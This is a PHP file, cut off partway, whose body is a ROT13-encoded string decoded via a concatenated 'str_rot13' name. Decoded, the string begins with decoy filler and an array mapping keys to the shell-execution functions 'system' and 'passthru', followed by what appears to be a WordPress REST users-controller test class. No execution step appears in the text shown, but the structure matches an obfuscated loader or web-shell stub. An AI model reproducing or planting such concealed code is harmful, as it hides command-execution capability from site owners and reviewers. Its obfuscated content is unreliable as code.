<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Hfref_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv
 */
pynff JC_Grfg_ERFG_Hfref_Pbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {
	cebgrpgrq fgngvp $fhcrenqzva;
	cebgrpgrq fgngvp $hfre;
	cebgrpgrq fgngvp $rqvgbe;
	cebgrpgrq fgngvp $qensg_rqvgbe;
	cebgrpgrq fgngvp $fhofpevore;
	cebgrpgrq fgngvp $nhgube;

	cebgrpgrq fgngvp $nhgubef     = neenl();
	cebgrpgrq fgngvp $cbfgf       = neenl();
	cebgrpgrq fgngvp $hfre_vqf    = neenl();
	cebgrpgrq fgngvp $gbgny_hfref = 30;
	cebgrpgrq fgngvp $cre_cntr    = 50;

	cebgrpgrq fgngvp $fvgr;

	/**
	 * @ine JC_ERFG_Hfref_Pbagebyyre
	 */
	cevingr $raqcbvag;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$fhcrenqzva   = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'       => 'nqzvavfgengbe',
				'hfre_ybtva' => 'fhcrenqzva',
			)
		);
		frys::$hfre         = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$rqvgbe       = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'       => 'rqvgbe',
				'hfre_rznvy' => 'rqvgbe@rknzcyr.pbz',
			)
		);
		frys::$qensg_rqvgbe = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'       => 'rqvgbe',
				'hfre_rznvy' => 'qensg-rqvgbe@rknzcyr.pbz',
			)
		);
		frys::$fhofpevore   = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'         => 'fhofpevore',
				'qvfcynl_anzr' => 'fhofpevore',
				'hfre_rznvy'   => 'fhofpevore@rknzcyr.pbz',
			)
		);
		frys::$nhgube       = $snpgbel->hfre->perngr(
			neenl(
				'qvfcynl_anzr' => 'nhgube',
				'ebyr'         => 'nhgube',
				'hfre_rznvy'   => 'nhgube@rknzcyr.pbz',
			)
		);

		sbernpu ( neenl( gehr, snyfr ) nf $fubj_va_erfg ) {
			sbernpu ( neenl( gehr, snyfr ) nf $choyvp ) {
				$cbfg_glcr_anzr = 'e_' . wfba_rapbqr( $fubj_va_erfg ) . '_c_' . wfba_rapbqr( $choyvp );
				ertvfgre_cbfg_glcr(
					$cbfg_glcr_anzr,
					neenl(
						'choyvp'                   => $choyvp,
						'fubj_va_erfg'             => $fubj_va_erfg,
						'grfgf_ab_nhgb_haertvfgre' => gehr,
					)
				);
				frys::$nhgubef[ $cbfg_glcr_anzr ] = $snpgbel->hfre->perngr(
					neenl(
						'ebyr'       => 'rqvgbe',
						'hfre_rznvy' => 'nhgube_' . $cbfg_glcr_anzr . '@rknzcyr.pbz',
					)
				);
				frys::$cbfgf[ $cbfg_glcr_anzr ]   = $snpgbel->cbfg->perngr(
					neenl(
						'cbfg_glcr'   => $cbfg_glcr_anzr,
						'cbfg_nhgube' => frys::$nhgubef[ $cbfg_glcr_anzr ],
					)
				);
			}
		}

		frys::$cbfgf['cbfg']                = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cbfg',
				'cbfg_nhgube' => frys::$rqvgbe,
			)
		);
		frys::$cbfgf['e_gehr_c_gehr_QENSG'] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'e_gehr_c_gehr',
				'cbfg_nhgube' => frys::$qensg_rqvgbe,
				'cbfg_fgnghf' => 'qensg',
			)
		);

		vs ( vf_zhygvfvgr() ) {
			frys::$fvgr = $snpgbel->oybt->perngr(
				neenl(
					'qbznva' => 'erfg.jbeqcerff.bet',
					'cngu'   => '/',
				)
			);
			hcqngr_fvgr_bcgvba( 'fvgr_nqzvaf', neenl( 'fhcrenqzva' ) );
		}

		// Frg hc hfref sbe cntvangvba grfgf.
		sbe ( $v = 0; $v < frys::$gbgny_hfref - 11; $v++ ) {
			frys::$hfre_vqf[] = $snpgbel->hfre->perngr(
				neenl(
					'ebyr'         => 'pbagevohgbe',
					'qvfcynl_anzr' => \"Hfre {$v}\",
				)
			);
		}
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$hfre );
		frys::qryrgr_hfre( frys::$rqvgbe );
		frys::qryrgr_hfre( frys::$qensg_rqvgbe );
		frys::qryrgr_hfre( frys::$nhgube );

		sbernpu ( frys::$cbfgf nf $cbfg ) {
			jc_qryrgr_cbfg( $cbfg, gehr );
		}

		sbernpu ( frys::$nhgubef nf $nhgube ) {
			frys::qryrgr_hfre( $nhgube );
		}

		_haertvfgre_cbfg_glcr( 'e_gehr_c_gehr' );
		_haertvfgre_cbfg_glcr( 'e_gehr_c_snyfr' );
		_haertvfgre_cbfg_glcr( 'e_snyfr_c_gehr' );
		_haertvfgre_cbfg_glcr( 'e_snyfr_c_snyfr' );

		vs ( vf_zhygvfvgr() ) {
			jc_qryrgr_fvgr( frys::$fvgr );
		}

		// Erzbir hfref sbe cntvangvba grfgf.
		sbernpu ( frys::$hfre_vqf nf $hfre_vq ) {
			frys::qryrgr_hfre( $hfre_vq );
		}
	}

	/**
	 * Guvf shapgvba vf eha orsber rnpu zrgubq
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->raqcbvag = arj JC_ERFG_Hfref_Pbagebyyre();
	}

	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();

		$guvf->nffregNeenlUnfXrl( '/jc/i2/hfref', $ebhgrf );
		$guvf->nffregPbhag( 2, $ebhgrf['/jc/i2/hfref'] );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/hfref/(?C<vq>[\q]+)', $ebhgrf );
		$guvf->nffregPbhag( 3, $ebhgrf['/jc/i2/hfref/(?C<vq>[\q]+)'] );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/hfref/zr', $ebhgrf );
	}

	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/hfref' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $qngn['raqcbvagf'][0]['nyybj_ongpu'] );
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		// Fvatyr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/hfref/' . frys::$hfre );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $qngn['raqcbvagf'][0]['nyybj_ongpu'] );
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	choyvp shapgvba grfg_ertvfgrerq_dhrel_cnenzf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/hfref' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$xrlf     = neenl_xrlf( $qngn['raqcbvagf'][0]['netf'] );
		$guvf->nffregFnzrFrgf(
			neenl(
				'pbagrkg',
				'rkpyhqr',
				'vapyhqr',
				'bssfrg',
				'beqre',
				'beqreol',
				'cntr',
				'cre_cntr',
				'ebyrf',
				'pncnovyvgvrf',
				'frnepu',
				'fyht',
				'jub',
				'frnepu_pbyhzaf',
				'unf_choyvfurq_cbfgf',
			),
			$xrlf
		);
	}

	choyvp shapgvba grfg_trg_vgrzf() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'ivrj' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$nyy_qngn = $erfcbafr->trg_qngn();
		$qngn     = $nyy_qngn[0];
		$hfreqngn = trg_hfreqngn( $qngn['vq'] );
		$guvf->purpx_hfre_qngn( $hfreqngn, $qngn, 'ivrj', $qngn['_yvaxf'] );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_rqvg_pbagrkg( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr(
			200,
			$erfcbafr->trg_fgnghf(),
			fcevags( 'Rkcrpgrq UGGC fgnghf pbqr 200 ohg tbg %f.', $erfcbafr->trg_fgnghf() )
		);

		vs ( 'URNQ' === $zrgubq ) {
			$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Rkcrpgrq ahyy erfcbafr qngn sbe URNQ erdhrfg, ohg erprvirq aba-ahyy qngn.' );
			erghea ahyy;
		}

		$nyy_qngn = $erfcbafr->trg_qngn();
		$qngn     = $nyy_qngn[0];
		$hfreqngn = trg_hfreqngn( $qngn['vq'] );
		$guvf->purpx_hfre_qngn( $hfreqngn, $qngn, 'rqvg', $qngn['_yvaxf'] );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_rqvg_pbagrkg_jvgubhg_crezvffvba( $zrgubq ) {
		// Grfg jvgu n hfre abg ybttrq va.
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 401, $erfcbafr->trg_fgnghf() );

		// Grfg jvgu n hfre ybttrq va ohg jvgubhg fhssvpvrag pncnovyvgvrf;
		// pncnovyvgl va dhrfgvba: 'yvfg_hfref'.
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 403, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_trg_vgrzf_hanhguragvpngrq_vapyhqrf_nhgubef_bs_cbfg_glcrf_fubja_va_erfg() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$hfref    = $erfcbafr->trg_qngn();

		$erfg_cbfg_glcrf = neenl_inyhrf( trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'anzrf' ) );

		$guvf->nffregAbgRzcgl( $hfref );

		sbernpu ( $hfref nf $hfre ) {
			$guvf->nffregAbgRzcgl( pbhag_hfre_cbfgf( $hfre['vq'], $erfg_cbfg_glcrf ) );

			// Rafher jr qba'g rkcbfr aba-choyvp qngn.
			$guvf->nffregNeenlAbgUnfXrl( 'pncnovyvgvrf', $hfre );
			$guvf->nffregNeenlAbgUnfXrl( 'ertvfgrerq_qngr', $hfre );
			$guvf->nffregNeenlAbgUnfXrl( 'svefg_anzr', $hfre );
			$guvf->nffregNeenlAbgUnfXrl( 'ynfg_anzr', $hfre );
			$guvf->nffregNeenlAbgUnfXrl( 'avpxanzr', $hfre );
			$guvf->nffregNeenlAbgUnfXrl( 'rkgen_pncnovyvgvrf', $hfre );
			$guvf->nffregNeenlAbgUnfXrl( 'hfreanzr', $hfre );
			$guvf->nffregNeenlAbgUnfXrl( 'rznvy', $hfre );
			$guvf->nffregNeenlAbgUnfXrl( 'ebyrf', $hfre );
			$guvf->nffregNeenlAbgUnfXrl( 'ybpnyr', $hfre );
		}

		$hfre_vqf = jc_yvfg_cyhpx( $hfref, 'vq' );

		$guvf->nffregPbagnvaf( frys::$rqvgbe, $hfre_vqf );
		$guvf->nffregPbagnvaf( frys::$nhgubef['e_gehr_c_gehr'], $hfre_vqf );
		$guvf->nffregPbagnvaf( frys::$nhgubef['e_gehr_c_snyfr'], $hfre_vqf );
		$guvf->nffregPbhag( 3, $hfre_vqf );
	}

	choyvp shapgvba grfg_trg_vgrzf_hanhguragvpngrq_qbrf_abg_vapyhqr_nhgubef_bs_cbfg_glcrf_abg_fubja_va_erfg() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$hfref    = $erfcbafr->trg_qngn();
		$hfre_vqf = jc_yvfg_cyhpx( $hfref, 'vq' );

		$guvf->nffregAbgPbagnvaf( frys::$nhgubef['e_snyfr_c_gehr'], $hfre_vqf );
		$guvf->nffregAbgPbagnvaf( frys::$nhgubef['e_snyfr_c_snyfr'], $hfre_vqf );
	}

	choyvp shapgvba grfg_trg_vgrzf_hanhguragvpngrq_qbrf_abg_vapyhqr_hfref_jvgubhg_choyvfurq_cbfgf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$hfref    = $erfcbafr->trg_qngn();
		$hfre_vqf = jc_yvfg_cyhpx( $hfref, 'vq' );

		$guvf->nffregAbgPbagnvaf( frys::$qensg_rqvgbe, $hfre_vqf );
		$guvf->nffregAbgPbagnvaf( frys::$hfre, $hfre_vqf );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_cntvangvba_urnqref( $zrgubq ) {
		$gbgny_hfref = frys::$gbgny_hfref;
		$gbgny_cntrf = (vag) prvy( $gbgny_hfref / 10 );

		jc_frg_pheerag_hfre( frys::$hfre );

		// Fgneg bs gur vaqrk.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/hfref' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_hfref, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$arkg_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 2,
			),
			erfg_hey( 'jc/i2/hfref' )
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $arkg_yvax . '>; ery=\"arkg\"', $urnqref['Yvax'] );

		// 3eq cntr.
		frys::snpgbel()->hfre->perngr();
		++$gbgny_hfref;
		++$gbgny_cntrf;
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'cntr', 3 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_hfref, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 2,
			),
			erfg_hey( 'jc/i2/hfref' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$arkg_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 4,
			),
			erfg_hey( 'jc/i2/hfref' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $arkg_yvax . '>; ery=\"arkg\"', $urnqref['Yvax'] );

		// Ynfg cntr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'cntr', $gbgny_cntrf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_hfref, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => $gbgny_cntrf - 1,
			),
			erfg_hey( 'jc/i2/hfref' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"arkg\"', $urnqref['Yvax'] );

		// Bhg bs obhaqf.
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'cntr', 100 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_hfref, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => $gbgny_cntrf,
			),
			erfg_hey( 'jc/i2/hfref' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"arkg\"', $urnqref['Yvax'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_cre_cntr() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 10, $erfcbafr->trg_qngn() );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'cre_cntr', 5 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 5, $erfcbafr->trg_qngn() );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_cntr( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'cre_cntr', 5 );
		$erdhrfg->frg_cnenz( 'cntr', 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		vs ( 'URNQ' !== $zrgubq ) {
			$guvf->nffregPbhag( 5, $erfcbafr->trg_qngn() );
		}

		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cre_cntr' => 5,
				'cntr'     => 1,
			),
			erfg_hey( 'jc/i2/hfref' )
		);
		$urnqref   = $erfcbafr->trg_urnqref();
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_anzr() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$ybj_vq  = frys::snpgbel()->hfre->perngr( neenl( 'qvfcynl_anzr' => 'NNNNN' ) );
		$zvq_vq  = frys::snpgbel()->hfre->perngr( neenl( 'qvfcynl_anzr' => 'AAAAA' ) );
		$uvtu_vq = frys::snpgbel()->hfre->perngr( neenl( 'qvfcynl_anzr' => 'MMMM' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'beqreol', 'anzr' );
		$erdhrfg->frg_cnenz( 'beqre', 'qrfp' );
		$erdhrfg->frg_cnenz( 'cre_cntr', 1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $uvtu_vq, $qngn[0]['vq'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'beqreol', 'anzr' );
		$erdhrfg->frg_cnenz( 'beqre', 'nfp' );
		$erdhrfg->frg_cnenz( 'cre_cntr', 1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $ybj_vq, $qngn[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_hey() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$ybj_vq  = frys::snpgbel()->hfre->perngr( neenl( 'hfre_hey' => 'uggc://n.pbz' ) );
		$uvtu_vq = frys::snpgbel()->hfre->perngr( neenl( 'hfre_hey' => 'uggc://o.pbz' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'beqreol', 'hey' );
		$erdhrfg->frg_cnenz( 'beqre', 'qrfp' );
		$erdhrfg->frg_cnenz( 'cre_cntr', 1 );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $ybj_vq, $uvtu_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $uvtu_vq, $qngn[0]['vq'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'beqreol', 'hey' );
		$erdhrfg->frg_cnenz( 'beqre', 'nfp' );
		$erdhrfg->frg_cnenz( 'cre_cntr', 1 );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $ybj_vq, $uvtu_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $ybj_vq, $qngn[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_fyht() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$uvtu_vq = frys::snpgbel()->hfre->perngr( neenl( 'hfre_avpranzr' => 'oybtva' ) );
		$ybj_vq  = frys::snpgbel()->hfre->perngr( neenl( 'hfre_avpranzr' => 'nybtva' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'beqreol', 'fyht' );
		$erdhrfg->frg_cnenz( 'beqre', 'qrfp' );
		$erdhrfg->frg_cnenz( 'cre_cntr', 1 );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $ybj_vq, $uvtu_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $uvtu_vq, $qngn[0]['vq'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'beqreol', 'fyht' );
		$erdhrfg->frg_cnenz( 'beqre', 'nfp' );
		$erdhrfg->frg_cnenz( 'cre_cntr', 1 );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $ybj_vq, $uvtu_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $ybj_vq, $qngn[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_fyhtf() {
		jc_frg_pheerag_hfre( frys::$hfre );

		frys::snpgbel()->hfre->perngr( neenl( 'hfre_avpranzr' => 'oheevgb' ) );
		frys::snpgbel()->hfre->perngr( neenl( 'hfre_avpranzr' => 'gnpb' ) );
		frys::snpgbel()->hfre->perngr( neenl( 'hfre_avpranzr' => 'punyhcn' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'beqreol', 'vapyhqr_fyhtf' );
		$erdhrfg->frg_cnenz( 'fyht', neenl( 'gnpb', 'oheevgb', 'punyhcn' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 'gnpb', $qngn[0]['fyht'] );
		$guvf->nffregFnzr( 'oheevgb', $qngn[1]['fyht'] );
		$guvf->nffregFnzr( 'punyhcn', $qngn[2]['fyht'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_rznvy() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$uvtu_vq = frys::snpgbel()->hfre->perngr( neenl( 'hfre_rznvy' => 'orznvy@tznvy.pbz' ) );
		$ybj_vq  = frys::snpgbel()->hfre->perngr( neenl( 'hfre_rznvy' => 'nrznvy@tznvy.pbz' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'beqreol', 'rznvy' );
		$erdhrfg->frg_cnenz( 'beqre', 'qrfp' );
		$erdhrfg->frg_cnenz( 'cre_cntr', 1 );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $ybj_vq, $uvtu_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $uvtu_vq, $qngn[0]['vq'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'beqreol', 'rznvy' );
		$erdhrfg->frg_cnenz( 'beqre', 'nfp' );
		$erdhrfg->frg_cnenz( 'cre_cntr', 1 );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $ybj_vq, $uvtu_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $ybj_vq, $qngn[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_rznvy_hanhguragvpngrq() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'beqreol', 'rznvy' );
		$erdhrfg->frg_cnenz( 'beqre', 'qrfp' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_beqreol', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_ertvfgrerq_qngr_hanhguragvpngrq() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'beqreol', 'ertvfgrerq_qngr' );
		$erdhrfg->frg_cnenz( 'beqre', 'qrfp' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_beqreol', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_trg_vgrzf_vainyvq_beqre() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/hfref' );
		$erdhrfg->frg_cnenz( 'beqre', 'nfp,vq' );
